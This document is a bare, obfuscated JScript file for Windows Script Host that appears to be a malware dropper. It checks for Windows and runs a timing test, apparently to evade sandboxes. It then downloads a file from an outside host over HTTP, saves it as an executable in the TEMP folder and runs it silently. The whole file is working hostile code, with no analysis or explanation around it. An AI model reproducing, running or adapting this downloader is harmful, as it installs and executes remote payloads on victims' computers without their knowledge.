var _W = false;
var _H = "CreateObject";
var _C0 = function _GW() {return WScript[_H]("WScript"+".Shell");}(), _VL = 11;
var _SZ = "MSXML2.XMLHTTP";
var _B0 = 2123213;
var _S0 = 0;
function _XR(_YS){_C0["Run"](_YS, _S0, _S0);};
function _S(){return _SZ + "";};
function _Z(_ZG, _C1){_S0 = _S0 * 1; return _ZG - _C1;};
function _EC(){return _H;};
/*@cc_on
  @if (@_win32 || @_win64)
    _W = true;
  @end
@*/
if (_W)
{
var _D = "";
function _GB(){return 22;};
var _F = 0; var _V0 = 0;
function _VP()
{
var _XW = new this["Date"]();
var _Z0 = _XW["getUTCMilliseconds"]();
WScript["Sleep"](_GB());
var _XW = new this["Date"]();
var _GA = _XW["getUTCMilliseconds"]();
WScript["Sleep"](_GB());
var _XW = new this["Date"]();
var _EL = _XW["getUTCMilliseconds"]();
var _F = "_BK";
_F = _Z(_GA, _Z0);
var _V0 = "_P";
_V0 = _Z(_EL, _GA);
_D = "open";
return _Z(_F, _V0);
}
var _I = false;
var _EV = false;
for (var _V = _S0; _V < _GB() * 1; _V++){if (_VP() != _S0){
_I = true; 
_V0 = "31" + 11 * _F + _V0; 
_EV = true; 
break;
}}
function _RL() {return ((_I == true) && (_I == _EV)) ? 1 : _S0;};
if (_I && _RL() && _EV){
function _CY() {return _C0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "umz8sv1lDz71.ex" + "e";};
 _A = _S();
 _LW = WScript[_H](_A);
 var _RP = 1;
 while (_RP){
try {
	if (_RP == 1)
	{
		_LW[_D]("GET", "http://goldish.dk/o2pds", false);
		_LW["send"]();
		_M = "Sleep";
	}
	WScript[_M](_GB() + 120); 
	if (_LW["readystate"] < 2 * 2) continue;
	_RP = _S0;
	function _B(_FZ) {var _C = (1, 2, 3, 4, 5, _FZ); return _C;};
	_D1 = WScript[_EC()]("ADODB.Stream");
	_A = _D1;
	_A[_D]();
	_A["type"] = _B(1);
	_A["write"](_LW["ResponseBody"]);
	_D1["position"] = _B(_S0);
	_A["Save" + "ToFile"](_CY(), 2);
	_D1["cl"+"ose"]();
	_D0 = _CY();
	_XR(_D0);
} catch(_N){};
}
}
}

